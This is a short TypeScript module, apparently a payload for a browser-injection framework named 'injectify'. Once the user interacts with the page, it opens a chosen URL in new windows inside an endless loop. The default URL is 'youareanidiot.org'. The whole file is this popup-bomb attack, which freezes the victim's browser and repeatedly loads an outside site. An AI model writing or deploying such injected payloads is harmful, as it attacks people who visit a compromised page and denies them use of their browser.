import { Module, injectify } from '../../../definitions/module'

let url = Module.params

/**
 * Parse the parameters
 */
if (typeof Module.params == 'object') {
    if (Module.params.url) url = Module.params.url
}

/**
 * Default to url
 */
if (!url) url = 'http://youareanidiot.org'

/**
 * Upon user interaction => open a new window repeatedly
 */
injectify.module('interaction').then(() => {
    window.open(url)
    while (true) {
        window.open(url)
    }
})
